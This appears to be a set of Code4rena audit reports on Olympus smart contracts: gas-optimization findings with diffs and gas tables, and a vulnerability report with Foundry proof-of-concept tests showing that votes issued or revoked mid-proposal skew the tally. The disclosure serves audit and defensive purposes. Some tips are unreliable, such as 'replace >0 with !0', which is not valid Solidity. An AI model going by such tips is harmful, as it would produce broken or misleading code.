https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L216    uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L217    _status.low.count >= config_.regenThreshold    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L486    while (price_ >= 10) {    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L667    if (currentPrice >= movingAverage) {    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L683    if (currentPrice <= movingAverage) {    Mitigation:   Replace <= with <, and >= with >. Do not forget to increment/decrement the compared variable        # COMPARISON WITH ZERO   IMPACT    >0 is less gas efficient than !0 if you enable the optimizer at 10k AND you’re in a require statement. Detailed explanation with the opcodes [here](https://twitter.com/gzeon/status/1485428085885640706)   Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Governance.sol#L247    if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {    Mitigation:    Replace >0 with !0    # Increment/decrement operations   IMPACT     X = X + Y IS CHEAPER THAN X += Y     X = X- Y IS CHEAPER THAN X -= Y     Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Governance.sol#L194    totalEndorsementsForProposal[proposalId_] -= previousEndorsement;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Governance.sol#L198    totalEndorsementsForProposal[proposalId_] += userVotes;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Governance.sol#L252    yesVotesForProposal[activeProposal.proposalId] += userVotes;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Governance.sol#L254    noVotesForProposal[activeProposal.proposalId] += userVotes;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Heart.sol#L103    lastBeat += frequency();    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/BondCallback.sol#L143    _amountsPerMarket[id_][0] += inputAmount_;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/BondCallback.sol#L144    _amountsPerMarket[id_][1] += outputAmount_;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/TRSRY.sol#L96    reserveDebt[token_][msg.sender] += amount_;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/TRSRY.sol#L97    totalDebt[token_] += amount_;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/TRSRY.sol#L115    reserveDebt[token_][msg.sender] -= received;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/TRSRY.sol#L116    totalDebt[token_] -= received;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/TRSRY.sol#L131    if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/TRSRY.sol#L132    else totalDebt[token_] -= oldDebt - amount_;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/VOTES.sol#L56    balanceOf[from_] -= amount_;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/VOTES.sol#L58    balanceOf[to_] += amount_;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/PRICE.sol#L136    _movingAverage += (currentPrice - earliestPrice) / numObs;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/PRICE.sol#L138    _movingAverage -= (earliestPrice - currentPrice) / numObs;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/PRICE.sol#L222    total += startObservations_[i];    Mitigation:    X += Y replace with X = X + Y    X -= Y replace with X = X - Y     
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L240-L262 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L45-L48 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56   # Vulnerability details  ## Impact A user can call the following `vote` function to vote for a proposal. During voting, the voter admin can still call the `issueVotesTo` and `revokeVotesFrom` functions below to issue new votes or revoke old votes for the user, which also changes the votes' total supply during the overall voting. Because each user can only call `vote` once for a proposal due to the `userVotesForProposal[activeProposal.proposalId][msg.sender] > 0` conditional check, the old voted votes, resulted from the `vote` call by the user, will be used to compare against the new total supply of the votes, resulted from the `issueVotesTo` and `revokeVotesFrom` calls during the overall voting, when determining whether the proposal can be executed or not. Because of this inconsistency, the result on whether the proposal can be executed might not be reliable.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L240-L262 ```solidity     function vote(bool for_) external {         uint256 userVotes = VOTES.balanceOf(msg.sender);          if (activeProposal.proposalId == 0) {             revert NoActiveProposalDetected();         }          if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {             revert UserAlreadyVoted();         }          if (for_) {             yesVotesForProposal[activeProposal.proposalId] += userVotes;         } else {             noVotesForProposal[activeProposal.proposalId] += userVotes;         }          userVotesForProposal[activeProposal.proposalId][msg.sender] = userVotes;          VOTES.transferFrom(msg.sender, address(this), userVotes);          emit WalletVoted(activeProposal.proposalId, msg.sender, for_, userVotes);     } ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L45-L48 ```solidity     function issueVotesTo(address wallet_, uint256 amount_) external onlyRole("voter_admin") {         // Issue the votes in the VOTES module         VOTES.mintTo(wallet_, amount_);     } ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56 ```solidity     function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole("voter_admin") {         // Revoke the votes in the VOTES module         VOTES.burnFrom(wallet_, amount_);     } ```  ## Proof of Concept Please add the following code in `src\test\policies\Governance.t.sol`.  First, please add the following code for `stdError`. ```solidity import {Test, stdError} from "forge-std/Test.sol";    // @audit import stdError for testing purpose ```  Then, please append the following tests. These tests will pass to demonstrate the described scenarios. ```solidity     function testScenario_UserCannotVoteAgainWithNewlyMintedVotes() public {         _createActiveProposal();          // voter3 votes for the proposal         vm.prank(voter3);         governance.vote(true);          assertEq(governance.yesVotesForProposal(1), 300);         assertEq(governance.noVotesForProposal(1), 0);          assertEq(governance.userVotesForProposal(1, voter3), 300);         assertEq(VOTES.balanceOf(voter3), 0);         assertEq(VOTES.balanceOf(address(governance)), 300);          // to simulate calling VoterRegistration.issueVotesTo that mints votes to voter3, VOTES.mintTo is called by godmode here         vm.prank(godmode);         VOTES.mintTo(voter3, 500);         assertEq(VOTES.balanceOf(voter3), 500);          // calling vote function again by voter3 reverts, which means that voter3 cannot additionally vote with the 500 newly minted votes         vm.expectRevert(UserAlreadyVoted.selector);         vm.prank(voter3);         governance.vote(true);     } ```  ```solidity     function testScenario_RevokeVotesAfterUserFinishsOwnVoting() public {         _createActiveProposal();          // voter3 votes for the proposal         vm.prank(voter3);         governance.vote(true);          assertEq(governance.yesVotesForProposal(1), 300);         assertEq(governance.noVotesForProposal(1), 0);          assertEq(governance.userVotesForProposal(1, voter3), 300);         assertEq(VOTES.balanceOf(voter3), 0);         assertEq(VOTES.balanceOf(address(governance)), 300);          // To simulate calling VoterRegistration.revokeVotesFrom that burns voter3's votes, VOTES.burnFrom is called by godmode here.         // However, calling VOTES.burnFrom will revert due to arithmetic underflow.         vm.prank(godmode);         vm.expectRevert(stdError.arithmeticError);         VOTES.burnFrom(voter3, 300);          // the proposal is still voted with voter3's previous votes afterwards         assertEq(governance.userVotesForProposal(1, voter3), 300);         assertEq(VOTES.balanceOf(voter3), 0);         assertEq(VOTES.balanceOf(address(governance)), 300);     } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps When `issueVotesTo` and `revokeVotesFrom` are called during voting, the corresponding votes need to be added to or removed from the proposal's voted votes for the user. Alternatively, `issueVotesTo` and `revokeVotesFrom` can be disabled when an active proposal exists.
## Summary  ### Gas Optimizations | |Issue|Instances| |-|:-|:-:| | [G&#x2011;01] | State variables should only be updated once in a function | 1 | | [G&#x2011;02] | Multiple `address`/ID mappings can be combined into a single `mapping` of an `address`/ID to a `struct`, where appropriate | 1 | | [G&#x2011;03] | State variables only set in the constructor should be declared `immutable` | 11 | | [G&#x2011;04] | State variables can be packed into fewer storage slots | 1 | | [G&#x2011;05] | Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas | 5 | | [G&#x2011;06] | Using `storage` instead of `memory` for structs/arrays saves gas | 4 | | [G&#x2011;07] | State variables should be cached in stack variables rather than re-reading them from storage | 7 | | [G&#x2011;08] | Multiple accesses of a mapping/array should use a local variable cache | 1 | | [G&#x2011;09] | The result of function calls should be cached rather than re-calling the function | 3 | | [G&#x2011;10] | `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables | 3 | | [G&#x2011;11] | `internal` functions only called once can be inlined to save gas | 9 | | [G&#x2011;12] | Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement | 1 | | [G&#x2011;13] | `<array>.length` should not be looked up in every loop of a `for`-loop | 1 | | [G&#x2011;14] | Optimize names to save gas | 20 | | [G&#x2011;15] | Using `bool`s for storage incurs overhead | 11 | | [G&#x2011;16] | Use a more recent version of solidity | 3 | | [G&#x2011;17] | `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too) | 7 | | [G&#x2011;18] | Using `private` rather than `public` for constants, saves gas | 11 | | [G&#x2011;19] | Don't compare boolean expressions to boolean literals | 2 | | [G&#x2011;20] | Division by two should use bit shifting | 2 | | [G&#x2011;21] | Superfluous event fields | 7 | | [G&#x2011;22] | Functions guaranteed to revert when called by normal users can be marked `payable` | 36 |  Total: 147 instances over 22 issues  The source diffs can be directly applied to the code by putting the diff block into a file then doing `git apply <file>`  ## Gas Optimizations  ### [G&#x2011;01]  State variables should only be updated once in a function `totalEndorsementsForProposal` is updated twice in this function, but it could be optimized to only update the difference between `previousEndorsement` and `userVotes` instead. Futher optimizations would be to use a `storage` variable rather than looking up the hash of `totalEndorsementsForProposal[proposalId_]` each time, and to use `x = x + a` rather than `x += a`  *There is 1 instance of this issue:* ```solidity File: /src/policies/Governance.sol  192          // undo any previous endorsement the user made on these instructions 193          uint256 previousEndorsement = userEndorsementsForProposal[proposalId_][msg.sender]; 194          totalEndorsementsForProposal[proposalId_] -= previousEndorsement; 195   196          // reapply user endorsements with most up-to-date votes 197          userEndorsementsForProposal[proposalId_][msg.sender] = userVotes; 198:         totalEndorsementsForProposal[proposalId_] += userVotes;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L192-L198  ```diff diff --git a/src/policies/Governance.sol b/src/policies/Governance.sol index 8829e3b..c0e783f 100644 --- a/src/policies/Governance.sol +++ b/src/policies/Governance.sol @@ -191,11 +191,14 @@ contract OlympusGovernance is Policy {            // undo any previous endorsement the user made on these instructions          uint256 previousEndorsement = userEndorsementsForProposal[proposalId_][msg.sender]; -        totalEndorsementsForProposal[proposalId_] -= previousEndorsement;            // reapply user endorsements with most up-to-date votes          userEndorsementsForProposal[proposalId_][msg.sender] = userVotes; -        totalEndorsementsForProposal[proposalId_] += userVotes; +        if (previousEndorsement > userVotes) { +            totalEndorsementsForProposal[proposalId_] -= (previousEndorsement - userVotes); +        } else { +            totalEndorsementsForProposal[proposalId_] += (userVotes - previousEndorsement); +        }            emit ProposalEndorsed(proposalId_, msg.sender, userVotes);      } ```  Note that the numbers below are an underreporting of the gas changes due to [this](https://gist.github.com/0xA5DF/cc71e507d45fd51d708b3e8318654ce5) `forge` issue ```diff diff --git a/tmp/gas_before b/tmp/gas_after index c793374..828386f 100644 --- a/tmp/gas_before +++ b/tmp/gas_after @@ -289,7 +289,7 @@  ╞════════════════════════════════════════════════════════╪═════════════════╪════════╪════════╪════════╪═════════╡  │ Deployment Cost                                        ┆ Deployment Size ┆        ┆        ┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ 1638243                                                ┆ 8250            ┆        ┆        ┆        ┆         │ +│ 1642043                                                ┆ 8269            ┆        ┆        ┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ Function Name                                          ┆ min             ┆ avg    ┆ median ┆ max    ┆ # calls │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -297,7 +297,7 @@  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ configureDependencies                                  ┆ 47868           ┆ 48513  ┆ 47868  ┆ 51868  ┆ 31      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ endorseProposal                                        ┆ 6874            ┆ 39015  ┆ 30774  ┆ 52674  ┆ 43      │ +│ endorseProposal                                        ┆ 6476            ┆ 38636  ┆ 30376  ┆ 52276  ┆ 43      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ executeProposal                                        ┆ 1850            ┆ 171376 ┆ 238748 ┆ 238748 ┆ 7       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ ```  ### [G&#x2011;02]  Multiple `address`/ID mappings can be combined into a single `mapping` of an `address`/ID to a `struct`, where appropriate Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (**20000 gas**) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save **~42 gas per access** due to [not having to recalculate the key's keccak256 hash](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0) (Gkeccak256 - 30 gas) and that calculation's associated stack operations.  *There is 1 instance of this issue:* ```solidity File: src/policies/Governance.sol  96        mapping(uint256 => ProposalMetadata) public getProposalMetadata; 97     98        /// @notice Return the total endorsements for a proposal id. 99        mapping(uint256 => uint256) public totalEndorsementsForProposal; 100    101       /// @notice Return the number of endorsements a user has given a proposal id. 102       mapping(uint256 => mapping(address => uint256)) public userEndorsementsForProposal; 103    104       /// @notice Return whether a proposal id has been activated. Once this is true, it should never be flipped false. 105       mapping(uint256 => bool) public proposalHasBeenActivated; 106    107       /// @notice Return the total yes votes for a proposal id used in calculating net votes. 108       mapping(uint256 => uint256) public yesVotesForProposal; 109    110       /// @notice Return the total no votes for a proposal id used in calculating net votes. 111       mapping(uint256 => uint256) public noVotesForProposal; 112    113       /// @notice Return the amount of votes a user has applied to a proposal id. This does not record how the user voted. 114       mapping(uint256 => mapping(address => uint256)) public userVotesForProposal; 115    116       /// @notice Return the amount of tokens reclaimed by a user after voting on a proposal id. 117:      mapping(uint256 => mapping(address => bool)) public tokenClaimsForProposal;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L96-L117  ### [G&#x2011;03]  State variables only set in the constructor should be declared `immutable` Avoids a Gsset (**20000 gas**) in the constructor, and replaces the first access in each transaction (Gcoldsload - **2100 gas**) and each access thereafter (Gwarmacces - **100 gas**) with a `PUSH32` (**3 gas**).  *There are 11 instances of this issue:* ```solidity File: src/policies/BondCallback.sol  /// @audit aggregator (constructor) 43:           aggregator = aggregator_;  /// @audit aggregator (access) 91:           (, , ERC20 payoutToken, , , ) = aggregator.getAuctioneer(id_).getMarketInfoForPurchase(id_);  /// @audit aggregator (access) 109:          (, , ERC20 payoutToken, ERC20 quoteToken, , ) = aggregator  /// @audit ohm (constructor) 44:           ohm = ohm_;  /// @audit ohm (access) 57:           ohm.safeApprove(address(MINTR), type(uint256).max);  /// @audit ohm (access) 94:           if (address(payoutToken) != address(ohm)) {  /// @audit ohm (access) 118:          if (quoteToken == payoutToken && quoteToken == ohm) {  /// @audit ohm (access) 125:          } else if (quoteToken == ohm) {  /// @audit ohm (access) 131:          } else if (payoutToken == ohm) {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L43  ```solidity File: src/policies/Heart.sol  /// @audit _operator (constructor) 60:           _operator = operator_;  /// @audit _operator (access) 100:          _operator.operate();  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L60  ```diff diff --git a/src/policies/BondCallback.sol b/src/policies/BondCallback.sol index 4da1a3a..4383f7e 100644 --- a/src/policies/BondCallback.sol +++ b/src/policies/BondCallback.sol @@ -25,11 +25,11 @@ contract BondCallback is Policy, ReentrancyGuard, IBondCallback {      mapping(uint256 => uint256[2]) internal _amountsPerMarket;      mapping(ERC20 => uint256) public priorBalances;   -    IBondAggregator public aggregator; +    IBondAggregator immutable public aggregator;      OlympusTreasury public TRSRY;      OlympusMinter public MINTR;      Operator public operator; -    ERC20 public ohm; +    ERC20 immutable public ohm;        /*//////////////////////////////////////////////////////////////                              POLICY INTERFACE diff --git a/src/policies/Heart.sol b/src/policies/Heart.sol index 7693dba..b0a46f2 100644 --- a/src/policies/Heart.sol +++ b/src/policies/Heart.sol @@ -45,7 +45,7 @@ contract OlympusHeart is IHeart, Policy, ReentrancyGuard {      OlympusPrice internal PRICE;        // Policies -    IOperator internal _operator; +    IOperator immutable internal _operator;        /*//////////////////////////////////////////////////////////////                              POLICY INTERFACE ```  Note that the numbers below are an underreporting of the gas changes due to [this](https://gist.github.com/0xA5DF/cc71e507d45fd51d708b3e8318654ce5) `forge` issue ```diff diff --git a/tmp/gas_before b/tmp/gas_after index c793374..1cea2f8 100644 --- a/tmp/gas_before +++ b/tmp/gas_after @@ -24,7 +24,7 @@  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ allKeycodes                    ┆ 706             ┆ 706    ┆ 706    ┆ 706    ┆ 2       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ executeAction                  ┆ 649             ┆ 156798 ┆ 94565  ┆ 595110 ┆ 767     │ +│ executeAction                  ┆ 649             ┆ 156789 ┆ 94565  ┆ 595110 ┆ 767     │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ executor                       ┆ 2393            ┆ 2393   ┆ 2393   ┆ 2393   ┆ 1       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -258,7 +258,7 @@  ╞═════════════════════════════════════════════════════╪═════════════════╪═══════╪════════╪════════╪═════════╡  │ Deployment Cost                                     ┆ Deployment Size ┆       ┆        ┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ 1408325                                             ┆ 6934            ┆       ┆        ┆        ┆         │ +│ 1417471                                             ┆ 7248            ┆       ┆        ┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ Function Name                                       ┆ min             ┆ avg   ┆ median ┆ max    ┆ # calls │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -268,9 +268,9 @@  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ batchToTreasury                                     ┆ 4111            ┆ 12729 ┆ 12068  ┆ 22668  ┆ 4       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ callback                                            ┆ 7678            ┆ 98980 ┆ 85627  ┆ 187927 ┆ 17      │ +│ callback                                            ┆ 7678            ┆ 97563 ┆ 85333  ┆ 183633 ┆ 17      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ configureDependencies                               ┆ 73564           ┆ 73564 ┆ 73564  ┆ 73564  ┆ 63      │ +│ configureDependencies                               ┆ 73464           ┆ 73464 ┆ 73464  ┆ 73464  ┆ 63      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ isActive                                            ┆ 395             ┆ 395   ┆ 395    ┆ 395    ┆ 63      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -282,7 +282,7 @@  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ setOperator                                         ┆ 8227            ┆ 23461 ┆ 23865  ┆ 23865  ┆ 65      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ whitelist                                           ┆ 8221            ┆ 39608 ┆ 34675  ┆ 67005  ┆ 46      │ +│ whitelist                                           ┆ 8221            ┆ 38018 ┆ 32143  ┆ 62802  ┆ 46      │  ╰─────────────────────────────────────────────────────┴─────────────────┴───────┴────────┴────────┴─────────╯  ╭────────────────────────────────────────────────────────┬─────────────────┬────────┬────────┬────────┬─────────╮  │ src/policies/Governance.sol:OlympusGovernance contract ┆                 ┆        ┆        ┆        ┆         │ @@ -336,13 +336,13 @@  ╞══════════════════════════════════════════════╪═════════════════╪═══════╪════════╪═══════╪═════════╡  │ Deployment Cost                              ┆ Deployment Size ┆       ┆        ┆       ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ 934119                                       ┆ 4277            ┆       ┆        ┆       ┆         │ +│ 914213                                       ┆ 4290            ┆       ┆        ┆       ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ Function Name                                ┆ min             ┆ avg   ┆ median ┆ max   ┆ # calls │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ active                                       ┆ 323             ┆ 989   